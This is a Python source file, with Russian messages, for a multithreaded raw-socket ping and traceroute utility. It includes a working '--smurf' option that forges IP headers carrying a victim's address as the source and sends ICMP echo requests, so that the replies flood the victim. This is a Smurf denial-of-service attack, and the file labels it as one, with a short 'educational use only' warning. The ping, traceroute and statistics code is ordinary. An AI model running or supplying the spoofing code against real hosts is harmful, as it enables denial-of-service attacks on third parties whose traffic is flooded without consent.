import socket
import struct
import time
import threading
import select
import os
import sys
from typing import List, Tuple, Optional
import argparse
from dataclasses import dataclass
from enum import Enum


class PacketType(Enum):
    PING_REPLY = 0
    TTL_EXCEEDED = 11
    HOST_UNREACHABLE = 3


@dataclass
class PingResult:
    host: str
    success: bool
    rtt: float
    ttl: int
    error_message: str = ""


@dataclass
class TraceHop:
    hop_number: int
    host: str
    ip: str
    rtt: float
    success: bool


class ICMPPacket:

    @staticmethod
    def checksum(data: bytes) -> int:
        if len(data) % 2:
            data += b'\x00'

        checksum = 0
        for i in range(0, len(data), 2):
            checksum += (data[i] << 8) + data[i + 1]

        checksum = (checksum >> 16) + (checksum & 0xFFFF)
        checksum += (checksum >> 16)
        return ~checksum & 0xFFFF

    @staticmethod
    def create_ping_packet(packet_id: int, sequence: int, timestamp: float) -> bytes:
        header = struct.pack('!BBHHH', 8, 0, 0, packet_id, sequence)

        data = struct.pack('!d', timestamp) + b'PingTest' * 4

        packet = header + data
        checksum = ICMPPacket.checksum(packet)

        header = struct.pack('!BBHHH', 8, 0, checksum, packet_id, sequence)
        return header + data

    @staticmethod
    def parse_icmp_packet(packet: bytes) -> Tuple[int, int, int, float]:
        ip_header_len = (packet[0] & 0xF) * 4
        icmp_packet = packet[ip_header_len:]

        if len(icmp_packet) < 8:
            return 0, 0, 0, 0.0

        icmp_type, code, _, packet_id, sequence = struct.unpack('!BBHHH', icmp_packet[:8])

        timestamp = 0.0
        if len(icmp_packet) >= 16:
            try:
                timestamp = struct.unpack('!d', icmp_packet[8:16])[0]
            except:
                pass

        return icmp_type, code, packet_id, timestamp


class PingThread(threading.Thread):
    def __init__(self, host: str, count: int = 4, timeout: int = 5,
                 smurf_mode: bool = False, target_ip: str = None):
        super().__init__()
        self.host = host
        self.count = count
        self.timeout = timeout
        self.smurf_mode = smurf_mode
        self.target_ip = target_ip
        self.results: List[PingResult] = []
        self.packet_id = os.getpid() & 0xFFFF
        self.socket = None

    def create_socket(self) -> socket.socket:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
            sock.settimeout(self.timeout)

            if self.smurf_mode and self.target_ip:
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

            return sock
        except PermissionError:
            print(f"Ошибка: нужны права суперпользователя для создания raw сокета")
            sys.exit(1)

    def create_ip_header(self, dest_ip: str, payload_len: int) -> bytes:
        if not self.smurf_mode or not self.target_ip:
            return b''

        version_ihl = (4 << 4) + 5  # IPv4, header length 20 bytes
        tos = 0
        total_len = 20 + payload_len  # IP header + ICMP
        packet_id = 54321
        flags_fragment = 0
        ttl = 64
        protocol = socket.IPPROTO_ICMP
        checksum = 0
        source_ip = socket.inet_aton(self.target_ip)
        dest_ip_bytes = socket.inet_aton(dest_ip)

        header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_len, packet_id,
                             flags_fragment, ttl, protocol, checksum,
                             source_ip, dest_ip_bytes)

        # Вычисляем контрольную сумму
        checksum = ICMPPacket.checksum(header)
        header = struct.pack('!BBHHHBBH4s4s',
                             version_ihl, tos, total_len, packet_id,
                             flags_fragment, ttl, protocol, checksum,
                             source_ip, dest_ip_bytes)
        return header

    def receive_with_peek(self, sock: socket.socket) -> Optional[bytes]:
        try:
            ready, _, _ = select.select([sock], [], [], self.timeout)
            if not ready:
                return None

            packet = sock.recv(1024, socket.MSG_PEEK)
            if not packet:
                return None

            try:
                icmp_type, code, packet_id, _ = ICMPPacket.parse_icmp_packet(packet)
                if packet_id == self.packet_id:
                    return sock.recv(1024)
                else:
                    time.sleep(0.01)
                    return None
            except:
                sock.recv(1024)
                return None

        except socket.timeout:
            return None
        except Exception as e:
            print(f"Ошибка при получении пакета: {e}")
            return None

    def ping_host(self, sequence: int) -> PingResult:
        try:
            dest_ip = socket.gethostbyname(self.host)
        except socket.gaierror:
            return PingResult(self.host, False, 0.0, 0, "Не удалось разрешить имя хоста")

        sock = self.create_socket()

        try:
            timestamp = time.time()
            icmp_packet = ICMPPacket.create_ping_packet(self.packet_id, sequence, timestamp)

            if self.smurf_mode and self.target_ip:
                ip_header = self.create_ip_header(dest_ip, len(icmp_packet))
                packet = ip_header + icmp_packet
                print(f"[Smurf] Отправка пакета с поддельным источником {self.target_ip} -> {dest_ip}")
            else:
                packet = icmp_packet

            sock.sendto(packet, (dest_ip, 0))

            start_time = time.time()
            while time.time() - start_time < self.timeout:
                response = self.receive_with_peek(sock)
                if response:
                    icmp_type, code, resp_id, sent_timestamp = ICMPPacket.parse_icmp_packet(response)

                    if resp_id == self.packet_id:
                        rtt = (time.time() - sent_timestamp) * 1000

                        if icmp_type == PacketType.PING_REPLY.value:
                            return PingResult(self.host, True, rtt, 64, "")
                        elif icmp_type == PacketType.TTL_EXCEEDED.value:
                            return PingResult(self.host, False, rtt, 0, "TTL exceeded")
                        elif icmp_type == PacketType.HOST_UNREACHABLE.value:
                            return PingResult(self.host, False, rtt, 0, "Host unreachable")

            return PingResult(self.host, False, 0.0, 0, "Timeout")

        finally:
            sock.close()

    def run(self):
        print(f"Ping {self.host} ({self.count} пакетов)...")

        for i in range(self.count):
            result = self.ping_host(i + 1)
            self.results.append(result)

            if result.success:
                print(f"Reply from {self.host}: time={result.rtt:.2f}ms TTL={result.ttl}")
            else:
                print(f"Request to {self.host}: {result.error_message}")

            if i < self.count - 1:
                time.sleep(1)


class Traceroute:

    def __init__(self, host: str, max_hops: int = 30):
        self.host = host
        self.max_hops = max_hops
        self.packet_id = (os.getpid() + 1000) & 0xFFFF

    def traceroute(self) -> List[TraceHop]:
        results = []

        try:
            dest_ip = socket.gethostbyname(self.host)
        except socket.gaierror:
            print(f"Не удалось разрешить имя хоста: {self.host}")
            return results

        print(f"\nTraceroute to {self.host} ({dest_ip}), {self.max_hops} hops max:")

        for ttl in range(1, self.max_hops + 1):
            hop = self.send_probe(dest_ip, ttl)
            results.append(hop)

            if hop.success:
                try:
                    hostname = socket.gethostbyaddr(hop.ip)[0]
                except:
                    hostname = hop.ip

                print(f"{ttl:2d}  {hostname} ({hop.ip})  {hop.rtt:.2f} ms")

                if hop.ip == dest_ip:
                    print("Достигнут узел назначения")
                    break
            else:
                print(f"{ttl:2d}  * * *")

        return results

    def send_probe(self, dest_ip: str, ttl: int) -> TraceHop:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock.settimeout(5)
        sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, ttl)

        try:
            timestamp = time.time()
            packet = ICMPPacket.create_ping_packet(self.packet_id, ttl, timestamp)

            sock.sendto(packet, (dest_ip, 0))

            response = sock.recv(1024)
            rtt = (time.time() - timestamp) * 1000

            sender_ip = socket.inet_ntoa(response[12:16])

            return TraceHop(ttl, self.host, sender_ip, rtt, True)

        except socket.timeout:
            return TraceHop(ttl, self.host, "", 0.0, False)
        except Exception as e:
            return TraceHop(ttl, self.host, "", 0.0, False)
        finally:
            sock.close()


def main():
    parser = argparse.ArgumentParser(description='Программа параллельного ping с функциями traceroute и Smurf')
    parser.add_argument('hosts', nargs='+', help='Список хостов для ping')
    parser.add_argument('-c', '--count', type=int, default=4, help='Количество ping пакетов')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Таймаут в секундах')
    parser.add_argument('--traceroute', action='store_true', help='Выполнить traceroute')
    parser.add_argument('--smurf', action='store_true', help='Выполнить Smurf атаку')
    parser.add_argument('--target', type=str, help='IP адрес цели для Smurf атаки')

    args = parser.parse_args()

    if os.geteuid() != 0:
        print("Эта программа требует права суперпользователя (sudo)")
        sys.exit(1)

    if args.smurf:
        if not args.target:
            print("Для Smurf атаки необходимо указать --target")
            sys.exit(1)
        print(f"ВНИМАНИЕ: Выполняется Smurf атака с целью {args.target}")
        print("Используйте только в образовательных целях и с разрешения!")

    threads = []
    for host in args.hosts:
        thread = PingThread(host, args.count, args.timeout, args.smurf, args.target)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print("\n" + "=" * 50)
    print("СТАТИСТИКА PING:")
    print("=" * 50)

    for thread in threads:
        successful = sum(1 for r in thread.results if r.success)
        total = len(thread.results)
        loss_percent = ((total - successful) / total) * 100

        if successful > 0:
            rtts = [r.rtt for r in thread.results if r.success]
            min_rtt = min(rtts)
            max_rtt = max(rtts)
            avg_rtt = sum(rtts) / len(rtts)
        else:
            min_rtt = max_rtt = avg_rtt = 0

        print(f"\n{thread.host}:")
        print(
            f"  Пакетов: отправлено = {total}, получено = {successful}, потеряно = {total - successful} ({loss_percent:.1f}% потерь)")
        if successful > 0:
            print(f"  Время RTT мс: минимум = {min_rtt:.2f}, максимум = {max_rtt:.2f}, среднее = {avg_rtt:.2f}")

    if args.traceroute:
        for host in args.hosts:
            tracer = Traceroute(host)
            tracer.traceroute()


if __name__ == "__main__":
    main()